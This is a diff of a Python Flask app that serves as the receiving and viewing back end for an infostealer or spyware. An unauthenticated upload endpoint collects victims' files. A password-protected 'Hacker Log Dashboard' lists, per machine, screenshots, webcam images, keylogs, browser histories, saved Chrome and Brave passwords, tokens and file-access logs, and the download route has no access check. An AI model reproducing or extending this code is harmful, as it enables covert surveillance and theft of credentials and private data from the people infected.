@@ -1,175 +1,141 @@
-# app.py
-from flask import Flask, request, render_template_string
 import os
+from flask import Flask, request, send_from_directory, render_template_string, redirect, url_for
 from werkzeug.utils import secure_filename
 from datetime import datetime
 
+UPLOAD_ROOT = "logs"
+PASSWORD = "disha456"
+
 app = Flask(__name__)
-UPLOAD_FOLDER = 'logs'
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(UPLOAD_ROOT, exist_ok=True)
+
+COLUMNS = [
+    "Hostname", "Timestamp", "Screenshot", "Webcam", "Keylogs",
+    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
+    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
+]
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Log Viewer</title>
-    <style>
-        body {
-            background-color: #0f0f0f;
-            color: #00ff00;
-            font-family: Consolas, monospace;
-        }
-        h1 {
-            text-align: center;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-            table-layout: fixed;
-        }
-        th, td {
-            border: 1px solid #00ff00;
-            padding: 8px;
-            text-align: center;
-            word-wrap: break-word;
-            font-size: 14px;
-        }
-        th {
-            background-color: #000000;
-            font-size: 16px;
-        }
-        input[type="password"] {
-            background-color: #000;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            padding: 10px;
-            margin-top: 20px;
-            width: 200px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        button {
-            background-color: #00ff00;
-            color: #000;
-            padding: 8px 16px;
-            margin-top: 10px;
-            border: none;
-            cursor: pointer;
-        }
-        .screenshot-img {
-            width: 120px;
-        }
-    </style>
+  <title>Log Dashboard</title>
+  <style>
+    body { background-color: black; color: lime; font-family: monospace; padding: 20px; }
+    h2 { color: cyan; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+    th, td { border: 1px solid lime; padding: 6px; text-align: center; }
+    th { font-size: 16px; font-weight: bold; background-color: #111; }
+    td a { color: cyan; text-decoration: none; }
+    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
+    button { background: black; color: lime; border: 1px solid lime; padding: 5px 10px; }
+  </style>
 </head>
 <body>
-    {% if not authorized %}
-        <form method="POST">
-            <input type="password" name="password" placeholder="Enter password">
-            <button type="submit">Unlock</button>
-        </form>
-    {% else %}
-        <h1>Logs in Server</h1>
-        <table>
-            <tr>
-                <th>Hostname</th>
-                <th>Time</th>
-                <th> Desktop</th>
-                <th> Webcam</th>
-                <th> Keylogs</th>
-                <th> Decrypted Keylogs</th>
-                <th> Chrome History</th>
-                <th> Brave History</th>
-                <th> Chrome Passwords</th>
-                <th> Brave Passwords</th>
-                <th> Tokens</th>
-                <th> Recent Files</th>
-                <th> File Access</th>
-            </tr>
-            {% for row in rows %}
-            <tr>
-                {% for cell in row %}
-                    <td>
-                        {% if cell.endswith(('.png', '.jpg', '.jpeg')) %}
-                            <img src="{{ url_for('static', filename=cell) }}" class="screenshot-img">
-                        {% elif cell.endswith('.txt') %}
-                            <a href="{{ url_for('static', filename=cell) }}" target="_blank">{{ cell }}</a>
-                        {% else %}
-                            {{ cell }}
-                        {% endif %}
-                    </td>
-                {% endfor %}
-            </tr>
-            {% endfor %}
-        </table>
-    {% endif %}
+  {% if not authed %}
+    <h2>🔐 Enter Password to Access Log Viewer</h2>
+    <form method="POST">
+      <input name="password" type="password" placeholder="Enter password" />
+      <button type="submit">Login</button>
+    </form>
+  {% else %}
+    <h2>🧪 Hacker Log Dashboard</h2>
+    <table>
+      <tr>
+        {% for col in columns %}
+          <th>{{ col }}</th>
+        {% endfor %}
+      </tr>
+      {% for entry in logs %}
+        <tr>
+          <td>{{ entry.hostname }}</td>
+          <td>{{ entry.timestamp }}</td>
+          {% for file in entry.files %}
+            {% if file %}
+              <td><a href="{{ file }}">📥</a></td>
+            {% else %}
+              <td>-</td>
+            {% endif %}
+          {% endfor %}
+        </tr>
+      {% endfor %}
+    </table>
+  {% endif %}
 </body>
 </html>
 '''
 
-PASSWORD = "disha456"
-
-@app.route('/', methods=['GET', 'POST'])
+@app.route("/", methods=["GET", "POST"])
 def index():
-    authorized = False
-    if request.method == 'POST' and request.form.get("password") == PASSWORD:
-        authorized = True
-    elif request.args.get("auth") == PASSWORD:
-        authorized = True
+    authed = False
+    if request.method == "POST" and request.form.get("password") == PASSWORD:
+        authed = True
+    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=get_logs() if authed else [])
 
-    if not authorized:
-        return render_template_string(HTML_TEMPLATE, authorized=False)
+@app.route("/logs")
+def redirect_logs():
+    return redirect(url_for("index"))
 
-    rows = []
-    for folder in sorted(os.listdir(UPLOAD_FOLDER), reverse=True):
-        folder_path = os.path.join(UPLOAD_FOLDER, folder)
+@app.route("/api/receive", methods=["POST"])
+def receive():
+    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    save_path = os.path.join(UPLOAD_ROOT, folder_name)
+    os.makedirs(save_path, exist_ok=True)
+    for file in request.files.values():
+        filename = secure_filename(file.filename)
+        file.save(os.path.join(save_path, filename))
+    return "Logs received"
+
+@app.route("/download/<folder>/<filename>")
+def download(folder, filename):
+    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
+
+def get_logs():
+    logs = []
+    for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
+        folder_path = os.path.join(UPLOAD_ROOT, folder)
         if not os.path.isdir(folder_path): continue
 
         files = os.listdir(folder_path)
-        cells = [
-            folder.split("_")[0],  # Hostname
-            folder.split("_")[1],  # Time
-            find_file(files, folder_path, "screenshot"),
-            find_file(files, folder_path, "webcam"),
-            find_file(files, folder_path, "keylogs_export.txt"),
-            find_file(files, folder_path, "decrypted_keylogs.txt"),
-            find_file(files, folder_path, "chrome_history.txt"),
-            find_file(files, folder_path, "brave_history.txt"),
-            find_file(files, folder_path, "chrome_passwords.txt"),
-            find_file(files, folder_path, "brave_passwords.txt"),
-            find_file(files, folder_path, "extracted_tokens.txt"),
-            find_file(files, folder_path, "recent_files.txt"),
-            find_file(files, folder_path, "file_access_log.txt"),
-        ]
-        rows.append(cells)
+        row = {
+            "timestamp": folder,
+            "hostname": "Unknown",
+            "files": []
+        }
 
-    return render_template_string(HTML_TEMPLATE, authorized=True, rows=rows)
+        # Find hostname from any .txt log
+        for f in files:
+            if "activity" in f.lower() or "system" in f.lower() or "log" in f.lower():
+                try:
+                    with open(os.path.join(folder_path, f), "r", encoding="utf-8") as txt:
+                        content = txt.read()
+                        if "Computer Name:" in content:
+                            for line in content.splitlines():
+                                if "Computer Name" in line:
+                                    row["hostname"] = line.split(":")[1].strip()
+                                    break
+                except:
+                    pass
+                break
 
-def find_file(files, folder_path, keyword):
-    for f in files:
-        if keyword in f:
-            static_path = os.path.join("logs", os.path.basename(folder_path), f)
-            return static_path.replace("\\", "/")
-    return "-"
+        # Match files to columns (cell = download link)
+        def match_file(keywords):
+            for file in files:
+                if any(k in file.lower() for k in keywords):
+                    return f"/download/{folder}/{file}"
+            return None
 
-@app.route('/api/receive', methods=['POST'])
-def receive_logs():
-    try:
-        host = request.form.get("host") or "unknown"
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        foldername = f"{host}_{timestamp}"
-        path = os.path.join(UPLOAD_FOLDER, foldername)
-        os.makedirs(path, exist_ok=True)
+        row["files"].append(match_file(["screenshot"]))
+        row["files"].append(match_file(["webcam"]))
+        row["files"].append(match_file(["keylog"]))
+        row["files"].append(match_file(["decoded"]))
+        row["files"].append(match_file(["chrome_history"]))
+        row["files"].append(match_file(["brave_history"]))
+        row["files"].append(match_file(["chrome_password"]))
+        row["files"].append(match_file(["brave_password"]))
+        row["files"].append(match_file(["token"]))
+        row["files"].append(match_file(["recent"]))
+        row["files"].append(match_file(["file_access"]))
 
-        for file_key in request.files:
-            file = request.files[file_key]
-            filename = secure_filename(file.filename)
-            file.save(os.path.join(path, filename))
-
-        return "✅ Logs received", 200
-    except Exception as e:
-        return f"❌ Error: {str(e)}", 500
-
-if __name__ == "__main__":
-    app.run(debug=True)
+        logs.append(row)
+    return logs
